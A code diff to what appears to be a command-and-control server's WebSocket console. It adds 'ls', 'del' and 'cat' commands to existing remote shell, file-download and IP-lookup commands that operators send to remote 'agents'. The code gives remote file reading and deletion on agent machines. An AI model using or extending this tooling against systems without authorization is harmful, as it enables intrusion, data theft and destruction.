@@ -90,7 +90,11 @@ export const setupWS = (httpServer) => {
       "system <cmd>": "Run a shell command (same as '!<cmd>')",
       "!<cmd>": "A shorthand for 'system <cmd>'",
       "webload <url> <file>": "Download a file from a URL",
-      "ipinfo": "Get agent IP info using ipwho.is"
+      "ipinfo": "Get agent IP info using ipwho.is",
+      "ls": "List contents of current working directory",
+      "ls <dir>": "List contents of a given directory",
+      "del <file>": "Delete a file/directory",
+      "cat <file>": "Print out the contents of a file"
     }
 
     /**
@@ -311,6 +315,23 @@ export const setupWS = (httpServer) => {
           }else if (input === "ipinfo"){
             taskModel.createTask(username, {
               agentID, taskType: "ipinfo"
+            });
+          }else if (input.startsWith("ls")){
+            let dir = agent.cwd;
+            if (input.startsWith("ls "))
+              dir = input.substr(3).trim();
+            taskModel.createTask(username, {
+              agentID, taskType: "ls", data: {dir}
+            });
+          }else if (input.startsWith("del ")){
+            let file = input.substr(4).trim();
+            taskModel.createTask(username, {
+              agentID, taskType: "del", data: {file}
+            });
+          }else if (input.startsWith("cat ")){
+            let file = input.substr(4).trim();
+            taskModel.createTask(username, {
+              agentID, taskType: "cat", data: {file}
             });
           }else{ // Unknown query
             client.emit("agent_console_output", {
